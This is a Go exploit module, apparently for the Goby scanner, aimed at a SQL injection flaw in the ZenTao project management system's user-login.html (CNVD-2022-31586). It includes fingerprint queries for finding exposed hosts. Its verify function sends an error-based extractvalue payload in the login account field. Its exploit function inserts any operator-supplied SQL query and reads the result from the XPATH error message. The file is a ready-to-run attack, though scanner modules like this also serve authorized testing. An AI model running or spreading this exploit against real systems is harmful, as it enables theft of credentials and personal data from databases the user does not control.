package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Zentao user-login.html File SQL injection Vulnerability",
    "Description": "<p>Zentao project management software is a domestic open source project management software, focusing on the research and development of project management, built-in requirements management, task management, bug management, defect management, use case management, scheduled release and other functions, to achieve a complete life cycle management software, including 16.5 version has Sq; injection vulnerability, In addition to using the sql injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), even in the case of high authority can write Trojan horse to the server, further access to the server system.</p>",
    "Impact": "<p>Zentao router.class.php SQL injection</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to the update: <a href=\"https://www.zentao.net\">https://www.zentao.net</a></p>",
    "Product": "ZenTao-System",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection",
        "Information technology application innovation industry"
    ],
    "Translation": {
        "CN": {
            "Name": "禅道 user-login.html 文件 SQL 注入漏洞",
            "Product": "易软天创-禅道系统",
            "Description": "<p>禅道项目管理软件是国产的开源项目管理软件,专注研发项目管理,内置需求管理、任务管理、bug管理、缺陷管理、用例管理、计划发布等功能,实现了软件的完整生命周期管理。</p><p>禅道项目管理软件 16.5 版本存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>厂商已发布漏洞修复程序，请及时关注更新：<a href=\"https://www.zentao.net\">https://www.zentao.net</a><br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "信创"
            ]
        },
        "EN": {
            "Name": "Zentao user-login.html File SQL injection Vulnerability",
            "Product": "ZenTao-System",
            "Description": "<p>Zentao project management software is a domestic open source project management software, focusing on the research and development of project management, built-in requirements management, task management, bug management, defect management, use case management, scheduled release and other functions, to achieve a complete life cycle management software, including 16.5 version has Sq; injection vulnerability, In addition to using the sql injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), even in the case of high authority can write Trojan horse to the server, further access to the server system.<br></p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to the update: <a href=\"https://www.zentao.net\">https://www.zentao.net</a><br></p>",
            "Impact": "<p>Zentao router.class.php SQL injection</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "Information technology application innovation industry"
            ]
        }
    },
    "FofaQuery": "body=\"/zentao/\" || body=\"/js/all.js?v=16.5\"",
    "GobyQuery": "body=\"/zentao/\" || body=\"/js/all.js?v=16.5\"",
    "Author": "featherstark@outlook.com",
    "Homepage": "https://www.zentao.net",
    "DisclosureDate": "2022-04-27",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-31586"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Sql",
            "type": "input",
            "value": "select user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10489"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/user-login.html"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Referer", u.FixedHostInfo+uri)
			cfg.Data = "account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%29%29%23"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "c4ca4238a0b923820dcc509a6f75849") && strings.Contains(resp.Utf8Html, "XPATH syntax error")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sql := ss.Params["Sql"].(string)
			sql = strings.Replace(sql, " ", "%20", -1)
			uri := "/user-login.html"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Referer", expResult.HostInfo.FixedHostInfo+uri)
			cfg.Data = "account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28" + sql + "%29%2C0x7e%29%29%29%23"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = regexp.MustCompile(`XPATH syntax error: '(.*?)'`).FindAllString(resp.Utf8Html, -1)[0]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
